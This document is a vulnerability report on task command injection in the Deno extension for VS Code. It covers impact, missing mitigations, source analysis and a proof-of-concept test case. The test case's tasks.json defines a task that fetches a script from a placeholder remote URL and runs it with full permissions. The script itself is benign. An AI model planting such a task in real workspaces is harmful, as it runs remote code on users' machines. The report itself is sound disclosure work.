### Vulnerability List:

- Vulnerability Name: Task Command Injection via Malicious Workspace Configuration

- Description:
    1. An attacker crafts a malicious workspace containing a `tasks.json` or `deno.json`/`deno.jsonc` file.
    2. This file defines a Deno task with a malicious command or arguments.
    3. A victim opens this malicious workspace in VS Code with the Deno extension enabled.
    4. The Deno extension reads the task definitions from the workspace configuration files.
    5. The victim, either intentionally or accidentally (e.g., by clicking "Run Task" in the sidebar or using a keyboard shortcut), triggers the execution of the malicious task.
    6. The Deno extension executes the task using `vscode.tasks.executeTask`, which runs the attacker-defined command within the victim's VS Code environment.

- Impact:
    - **High**: Arbitrary command execution within the user's VS Code environment. This could lead to various malicious activities, including:
        - Data exfiltration: Stealing sensitive files or environment variables.
        - Code modification: Injecting malicious code into the user's projects.
        - System compromise: If the VS Code environment has sufficient permissions, the attacker could potentially gain control over the user's system.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
    - None explicitly identified in the provided project files. The extension relies on the user to only open trusted workspaces.

- Missing Mitigations:
    - **Input validation and sanitization:** The extension should validate and sanitize task definitions from workspace configuration files to prevent command injection. This includes:
        -  Whitelisting allowed commands and arguments.
        -  Escaping or quoting command arguments to prevent injection.
        -  Restricting the use of shell commands or features that could be exploited.
    - **User confirmation:** Before executing tasks defined in workspace configuration, especially for new or untrusted workspaces, the extension should prompt the user for confirmation, clearly displaying the command to be executed.
    - **Principle of least privilege:** The extension itself and the tasks it executes should operate with the minimum necessary privileges to limit the impact of potential vulnerabilities.

- Preconditions:
    1. Victim has the "Deno for Visual Studio Code" extension installed and enabled.
    2. Victim opens a malicious workspace containing crafted `tasks.json` or `deno.json`/`deno.jsonc` files.
    3. Victim triggers the execution of the malicious task defined in the workspace configuration.

- Source Code Analysis:
    - **`client\src\tasks.ts`:**
        - `DenoTaskDefinition` interface and `buildDenoTask` function are used to define and construct tasks based on configuration.
        - `ProcessExecution` is used to execute tasks, directly using user-provided `command` and `args`. No sanitization or validation is apparent in this code.
    - **`client\src\tasks_sidebar.ts`:**
        -  `DenoTasksTreeDataProvider` reads tasks from `deno.json`/`deno.jsonc` via LSP requests (`taskReq`).
        -  Tasks are executed using `tasks.executeTask(task.task)` in `#runTask` and `#runSelectedTask` methods, after being built by `buildDenoConfigTask` which ultimately relies on `buildDenoTask` from `tasks.ts`.
    - **`client\src\commands.ts`:**
        - `test` command handler in `commands.ts` shows how `DenoTaskDefinition` can be created with potentially user-controlled `testArgs`, `env`, and other settings. While this specific command is for testing, it illustrates the pattern of creating tasks based on configurations without explicit sanitization of command components.

    ```

- Security Test Case:
    1. **Setup:**
        - Create a new folder named `malicious-deno-workspace`.
        - Inside `malicious-deno-workspace`, create a `.vscode` folder.
        - Inside `.vscode`, create a `tasks.json` file with the following content:
        ```json
        {
            "version": "2.0.0",
            "tasks": [
                {
                    "type": "deno",
                    "command": "run",
                    "args": [
                        "-A",
                        "-r",
                        "https://raw.githubusercontent.com/your-username/malicious-script/main/malicious.js"
                    ],
                    "label": "Malicious Task"
                }
            ]
        }
        ```
        - Replace `https://raw.githubusercontent.com/your-username/malicious-script/main/malicious.js` with a URL to a simple malicious JavaScript file hosted online (e.g., on a public GitHub gist or your own web server). This script could simply display an alert or attempt to write a file to the system. For example, `malicious.js` could contain:
        ```javascript
        // malicious.js
        console.log("Malicious script executed!");
        Deno.writeTextFileSync("malicious_output.txt", "This file indicates successful command execution.");
        ```
        - Ensure a Deno project is enabled in VS Code (either globally or for workspace folders).
    2. **Execution:**
        - Open the `malicious-deno-workspace` folder in VS Code.
        - Open the Command Palette (Ctrl+Shift+P or Cmd+Shift+P).
        - Type and select "Tasks: Run Task".
        - Choose "deno: Malicious Task".
    3. **Verification:**
        - Observe if the "Malicious script executed!" message is printed in the task output panel.
        - Check if the `malicious_output.txt` file is created in the `malicious-deno-workspace` folder.
        - If these conditions are met, it confirms arbitrary command execution vulnerability.

This test case demonstrates how a malicious workspace can define and execute arbitrary Deno commands, confirming the task command injection vulnerability.
